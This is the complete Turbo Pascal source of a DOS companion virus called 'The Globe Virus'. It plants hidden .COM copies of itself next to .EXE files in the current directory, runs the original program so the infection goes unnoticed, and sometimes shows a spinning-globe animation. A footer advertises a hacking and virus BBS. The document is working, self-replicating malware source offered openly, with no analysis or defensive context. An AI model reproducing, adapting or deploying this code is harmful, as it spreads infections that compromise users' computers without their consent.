Program Worm;

{$M 2048,0,4096}

Uses Dos, Crt;

Var      F1 : File;
         F2 : File;
         O : String;
         Parm : String;
         P : DirStr;
         N : NameStr;
         E : ExtStr;
         Buf : Array[0..8000] of Byte;
         NumRead : Word;
         NumWritten : Word;
         DirInfo : SearchRec;
         ComExist : SearchRec;
         Infect : Byte;

Procedure StartOrigExe;
Begin
     O := ParamStr(0);
     FSplit(O,P,N,E);
     O := P+N+'.EXE';
     P := '';
     For NumRead := 1 To ParamCount Do
         P := P + ParamStr(NumRead);
     SwapVectors;
     Exec(O,P);
     SwapVectors;
End;

Procedure InfectExe;
Begin
FindFirst('*.EXE',Archive,DirInfo);
While (DosError = 0) And (Infect <> 0) Do
   Begin
   FSplit(DirInfo.Name,P,N,E);
   O := P+N+'.COM';
   FindFirst(O,Hidden,ComExist);
   If DosError <> 0 Then
        Begin
        Assign(F1,O);
        Rewrite(F1,1);
        BlockWrite(F1,buf,NumRead,NumWritten);
        Close(F1);
        SetFattr(F1,Hidden);
        Dec(Infect);
        End;
   FindNext(DirInfo);
   End;
End;

Procedure Activate;
Var
  T1,T2 : Integer;
  I     : Real;
  X , Y : Byte;
  Resolution : Integer;

Begin
ClrScr;
I := 0;
T2 := 38;
Randomize;
Repeat
Resolution := 50;
For T1 := 0 to Resolution Do
    Begin
    X := Abs(40+Round(Sin(I)*T2));
    Y := Abs(12-Round(Cos(I)*10));
    GotoXY(X,Y);
    Write('Û');
    I := I + ((Pi*2)/Resolution);
    End;
    T2 := T2 - 1;
    TextColor(Random(14)+1);
Until T2 < 2;
GotoXY(30,12);
TextColor(White);
Write('* The Globe Virus *');
 Asm
   Mov Ah,8
   Int 21h
 End;
ClrScr;
End;

Begin
  Infect := 3;
   Randomize;
   Assign(F2,ParamStr(0));
   Reset(F2,1);
   BlockRead(F2,buf,SizeOf(buf),NumRead);
   Close(F2);
     InfectExe;
     StartOrigExe;
     If Random(16) = 0 then Activate;
     Halt(DosExitCode);
End.

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
